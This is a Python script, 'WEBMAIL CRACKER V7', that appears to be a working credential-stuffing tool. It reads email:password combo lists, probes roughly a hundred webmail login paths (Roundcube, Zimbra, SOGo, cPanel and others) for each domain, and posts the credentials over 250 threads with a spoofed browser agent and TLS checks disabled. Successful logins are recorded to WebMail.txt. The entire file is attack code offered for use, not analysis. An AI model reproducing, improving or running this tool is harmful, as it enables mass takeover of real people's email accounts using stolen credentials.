#!/usr/bin/env python3
# coding: utf-8

import os
import re
import ssl
import socket
import threading
import time
import base64
import requests
import urllib3
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class _N:
        def __getattr__(self, n): return ""
    Fore = Style = _N()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════
THREADS       = 250
SCAN_TIMEOUT  = 4    # seconds per URL probe (phase 1)
LOGIN_TIMEOUT = 6    # seconds per login attempt (phase 2)

# ═══════════════════════════════════════════════════════
#  URL TEMPLATES   {d} = domain
# ═══════════════════════════════════════════════════════
TIER1_URLS = [
    "https://webmail.{d}/",
    "https://webmail.{d}/login",
    "https://mail.{d}/",
    "https://mail.{d}/login",
    "https://{d}:2096/",
    "https://{d}:2096/login/",
    "http://{d}:2096/",
    "http://{d}:2096/login/",
    "https://{d}/roundcube/",
    "https://{d}/roundcube/index.php",
    "https://webmail.{d}/roundcube/",
    "https://mail.{d}/roundcube/",
    "http://{d}/roundcube/",
    "https://{d}/zimbra/",
    "https://mail.{d}/zimbra/",
    "https://webmail.{d}/zimbra/",
    "https://{d}/SOGo/",
    "https://webmail.{d}/SOGo/",
    "https://{d}/webmail/",
    "https://{d}/webmail/login",
    "https://{d}/mail/",
    "https://{d}/mail/login",
]

TIER2_URLS = [
    "https://webmail.{d}/login/",
    "https://webmail.{d}/index.html",
    "https://webmail.{d}/signin",
    "https://webmail.{d}/signin/",
    "https://webmail.{d}/auth/login",
    "https://webmail.{d}/login/index.html",
    "https://webmail.{d}/login.html",
    "https://webmail.{d}/zimbra/hook/login",
    "https://webmail.{d}/zimbraAuth/",
    "https://mail.{d}/login/",
    "https://mail.{d}/index.html",
    "https://mail.{d}/signin",
    "https://mail.{d}/signin/",
    "https://mail.{d}/zimbra/",
    "https://mail.{d}/zimbra/hook/login",
    "https://mail.{d}/zimbraAuth/",
    "https://mail.{d}/SOGo/",
    "https://mail.{d}/roundcube/",
    "https://mail.{d}/roundcube/index.php",
    "https://mail.{d}/appsuite/login.html",
    "https://mail.{d}/squirrelmail/",
    "https://mail.{d}/iredmail/",
    "https://mail.{d}/horde/",
    "https://mail.{d}/webmail/",
    "https://mail.{d}/webmail/login",
    "https://zimbra.{d}/",
    "https://zimbra.{d}/login",
    "https://zimbra.mail.{d}/",
    "https://zimbra.mail.{d}/login",
    "https://zimbra1.{d}/",
    "https://zimbra1.mail.{d}/",
    "https://zimbra2.{d}/",
    "https://webmail2.{d}/",
    "https://webmail2.{d}/login",
    "https://webmail2.{d}/login/",
    "https://webmails.{d}/",
    "https://webmails.{d}/login",
    "https://webmails.{d}/login/",
    "https://webmail-es.{d}/",
    "https://webmail-es.{d}/login",
    "https://webmail-es.webapps.net/login",
    "https://webmail-es.webapps.net/login.jsp",
    "https://securemail.{d}/",
    "https://securemail.{d}/login",
    "https://securemail.{d}/login/",
    "https://secure.{d}/mail/",
    "https://secure.{d}/mail/login",
    "https://{d}/appsuite/login.html",
    "https://{d}/appsuite/",
    "https://{d}/squirrelmail/",
    "https://{d}/squirrelmail/src/login.php",
    "https://{d}/iredmail/",
    "https://{d}/iredmail/index.php",
    "https://{d}/horde/",
    "https://{d}/horde/imp/login.php",
    "https://{d}/rc/",
    "https://{d}/rc/index.php",
    "https://{d}/login/",
    "https://{d}/signin/",
    "https://{d}/auth/",
    "https://{d}/mail/webmail/",
    "https://{d}/webmail/index.html",
    "https://{d}/webmail/login.html",
    "https://{d}/webmail/signin",
    "https://{d}/mail/webmail/login",
    "https://{d}/imail/",
    "https://{d}/imail/login",
    "https://{d}/maillogin/",
    "https://{d}/login.php",
    "https://{d}/login.jsp",
    "https://{d}/webmail.php",
    "https://{d}/webmail.jsp",
    "http://webmail.{d}/",
    "http://webmail.{d}/login",
    "http://webmail.{d}/login/",
    "http://mail.{d}/",
    "http://mail.{d}/login",
    "http://mail.{d}/login/",
    "http://mail.{d}/zimbra/",
    "http://mail.{d}/roundcube/",
    "http://zimbra.{d}/",
    "http://webmail2.{d}/",
    "http://webmail-es.{d}/login",
    "http://{d}/webmail/",
    "http://{d}/webmail/login",
    "http://{d}/mail/",
    "http://{d}/mail/login",
    "http://{d}/roundcube/",
    "http://{d}/zimbra/",
    "http://{d}/squirrelmail/",
    "http://{d}/SOGo/",
    "http://{d}/appsuite/login.html",
    "http://{d}/login/",
    "http://{d}/signin/",
]

ALL_URLS = TIER1_URLS + TIER2_URLS

# ═══════════════════════════════════════════════════════
#  LOGIN FIELD COMBOS  →  (user_field, pass_field)
#  THIS FIXES THE KeyError
# ═══════════════════════════════════════════════════════
FIELD_COMBOS = [
    ("email",    "password"),
    ("user",     "password"),
    ("username", "password"),
    ("login",    "password"),
    ("email",    "passwd"),
    ("user",     "pass"),
    ("username", "pass"),
    ("username", "passwd"),
    ("Email",    "Password"),
    ("User",     "Pass"),
    ("mail",     "password"),
    ("mail",     "passwd"),
    ("address",  "password"),
]

# Extra field some panels accept (safe to always send)
EXTRA_FIELD = ("domain",)   # only add domain

# ═══════════════════════════════════════════════════════
#  MARKERS
# ═══════════════════════════════════════════════════════
SUCCESS_MARKERS = [
    "welcome", "inbox", "you're logged in", "you are logged in",
    "signed in", "logged in", "logout", "sign out", "sign-out",
    "log out", "log-out", "mailbox", "your mail", "mail box",
    "unread", "sent items", "sent folder", "drafts", "trash",
    "spam folder", "junk folder", "compose", "new message",
    "write mail", "reply", "forward", "delete mail", "empty trash",
]

LOGIN_PAGE_MARKERS = [
    "password", "passwd", "login", "sign in", "sign-in",
    "log in", "log-in", "username", "user name", "e-mail",
    "email address", "your email", "your password",
]

# ═══════════════════════════════════════════════════════
#  SHARED STATE
# ═══════════════════════════════════════════════════════
_thread_local = threading.local()
print_lock    = threading.Lock()
file_lock     = threading.Lock()
endpoint_lock = threading.Lock()
dns_lock      = threading.Lock()

dns_cache    = {}
endpoint_map = {}
dead_domains = set()
cracked      = set()

_write_buf = []
FLUSH_N    = 20
results    = []


def get_session():
    s = getattr(_thread_local, 'sess', None)
    if s is None:
        s = requests.Session()
        s.verify = False
        s.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/125.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })
        _thread_local.sess = s
    return s


def _flush():
    if not _write_buf:
        return
    with file_lock:
        with open("WebMail.txt", "a", encoding="utf-8") as f:
            for line in _write_buf:
                f.write(line + "\n")
    _write_buf.clear()


def save_hit(line):
    _write_buf.append(line)
    results.append(line)
    with print_lock:
        print(Fore.GREEN + Style.BRIGHT + f"  ★ {line}" + Fore.RESET, flush=True)
        if len(_write_buf) >= FLUSH_N:
            _flush()


def safe_print(msg):
    with print_lock:
        print(msg, flush=True)


# ═══════════════════════════════════════════════════════
#  DNS
# ═══════════════════════════════════════════════════════
def dns_resolve(domain):
    with dns_lock:
        if domain in dns_cache:
            return dns_cache[domain]
    try:
        ip = socket.getaddrinfo(domain, 443, socket.AF_INET)[0][4][0]
    except Exception:
        try:
            ip = socket.getaddrinfo(domain, 80, socket.AF_INET)[0][4][0]
        except Exception:
            ip = None
    with dns_lock:
        dns_cache[domain] = ip
    return ip


# ═══════════════════════════════════════════════════════
#  PHASE 1 – DISCOVER LOGIN PAGE
# ═══════════════════════════════════════════════════════
def probe_url(session, url):
    try:
        r = session.get(url, timeout=SCAN_TIMEOUT, allow_redirects=True)
        if r.status_code in (400, 401, 403, 404, 405,
                             500, 501, 502, 503, 505):
            return False
        if r.status_code == 302:
            loc = r.headers.get("Location", "").lower()
            return any(k in loc for k in ("login", "signin", "auth"))
        if r.status_code != 200:
            return False
        text_lower = r.text.lower()
        has_login_marker = any(m in text_lower for m in LOGIN_PAGE_MARKERS)
        has_form = ("form" in text_lower or "input" in text_lower
                    or "password" in text_lower)
        return has_login_marker and has_form
    except Exception:
        return False


def discover_endpoint(domain):
    session = get_session()
    for tier in (TIER1_URLS, TIER2_URLS):
        for template in tier:
            url = template.replace("{d}", domain)
            if probe_url(session, url):
                return url
    return None


def get_endpoint(domain):
    with endpoint_lock:
        if domain in dead_domains:
            return None
        if domain in endpoint_map:
            return endpoint_map[domain]

    url = discover_endpoint(domain)

    with endpoint_lock:
        if url:
            endpoint_map[domain] = url
            # GREEN = NOT DEAD
            safe_print(Fore.GREEN + f"  [+] {domain} → {url}" + Fore.RESET)
        else:
            dead_domains.add(domain)
            safe_print(Fore.RED + f"  [-] {domain} → no webmail" + Fore.RESET)
    return url


# ═══════════════════════════════════════════════════════
#  PHASE 2 – LOGIN
# ═══════════════════════════════════════════════════════
def check_response(r):
    if r.status_code in (301, 302, 303, 307, 308):
        loc = r.headers.get("Location", "").lower()
        if any(s in loc for s in
               ("inbox", "mail", "home", "dashboard", "folder",
                "sent", "draft", "compose", "message")):
            return True
        if "login" in loc or "signin" in loc or "auth" in loc:
            return False
        cookies = r.headers.get("Set-Cookie", "").lower()
        if "session" in cookies or "sid" in cookies or "auth" in cookies:
            return True
        return False

    if r.status_code != 200:
        return False

    text_lower = r.text.lower()
    no_pass_field = ("type=\"password\"" not in text_lower
                     and "type='password'" not in text_lower)

    for marker in SUCCESS_MARKERS:
        if marker in text_lower and no_pass_field:
            return True

    if no_pass_field and "form" not in text_lower and len(r.text) > 500:
        return True

    return False


def try_login(email, password, url, domain):
    session = get_session()
    dns_resolve(domain)   # warm cache

    # ── FIX: iterate (user_field, pass_field) tuples ──
    for user_field, pass_field in FIELD_COMBOS:
        data = {
            user_field: email,
            pass_field: password,
        }
        for ef in EXTRA_FIELD:
            data[ef] = domain

        try:
            r = session.post(url, data=data,
                             timeout=LOGIN_TIMEOUT,
                             allow_redirects=False)
            if check_response(r):
                return True
        except Exception:
            continue

    return False


# ═══════════════════════════════════════════════════════
#  WORKER
# ═══════════════════════════════════════════════════════
def worker(combos, done, total_count):
    for email, pwd, domain in combos:
        if email in cracked:
            with print_lock:
                done[0] += 1
            continue

        url = get_endpoint(domain)

        # ── ONLY "Processing => Combo" per credential ──
        with print_lock:
            done[0] += 1
            print(Fore.WHITE + f"  Processing => {email}:{pwd}"
                  + Fore.RESET, flush=True)

        if url is None:
            continue          # dead domain → nothing else

        if try_login(email, pwd, url, domain):
            cracked.add(email)
            save_hit(f"{email}:{pwd} ==> {url} ==> [WebMail Valid]")
        # no [FAIL] line → keeps output clean


# ═══════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════
def main():
    os.system("cls" if os.name == "nt" else "clear")

    print(Fore.CYAN + f"""
   WEBMAIL CRACKER  V7  –  FIXED
   {THREADS} threads | {len(ALL_URLS)} URL templates
   scan:{SCAN_TIMEOUT}s | login:{LOGIN_TIMEOUT}s
""" + Fore.RESET)
    print(Fore.YELLOW + "=" * 62 + Fore.RESET)

    path = input(Fore.YELLOW + "[+] Combo file: " + Fore.RESET).strip()
    try:
        lines = Path(path).read_text("utf-8", errors="ignore").splitlines()
    except Exception as e:
        print(Fore.RED + f"[!] {e}")
        input("\nPress Enter to exit...")
        return

    combos, seen = [], set()
    for ln in lines:
        ln = ln.strip()
        if ":" not in ln:
            continue
        e, p = ln.split(":", 1)
        e, p = e.strip().lower(), p.strip()
        if "@" not in e or not p:
            continue
        dom = e.split("@", 1)[1].strip().lower()
        if not dom or "." not in dom:
            continue
        k = f"{e}:{p}"
        if k in seen:
            continue
        seen.add(k)
        combos.append((e, p, dom))

    total_count = len(combos)
    if not total_count:
        print(Fore.RED + "[!] No valid combos.")
        input("\nPress Enter to exit...")
        return

    unique_domains = list({c[2] for c in combos})

    print(Fore.GREEN + f"[+] {total_count} combos | {len(unique_domains)} domains")
    print(Fore.CYAN + f"[+] {len(ALL_URLS)} URL templates | "
                      f"{len(FIELD_COMBOS)} field combos")
    actual_threads = min(THREADS, total_count)
    print(Fore.CYAN + f"[+] {actual_threads} threads\n")

    chunk_size = max(1, (total_count + actual_threads - 1) // actual_threads)
    chunks = [combos[i:i + chunk_size]
              for i in range(0, total_count, chunk_size)]

    done = [0]
    t0   = time.time()

    threads = []
    for chunk in chunks:
        t = threading.Thread(target=worker,
                             args=(chunk, done, total_count), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

    _flush()
    dt = int(time.time() - t0)

    print(Fore.CYAN + "\n" + "=" * 62)
    print(Fore.GREEN + f"  Time     : {dt}s")
    print(Fore.GREEN + f"  Cracked  : {len(cracked)} / {total_count}")
    print(Fore.GREEN + f"  Found    : {len(endpoint_map)}/{len(unique_domains)} domains")
    print(Fore.GREEN + f"  Dead     : {len(dead_domains)} domains")
    print(Fore.GREEN + f"  → WebMail.txt")
    print(Fore.CYAN + "=" * 62)
    input("\nPress Enter to exit...")


if __name__ == "__main__":
    main()
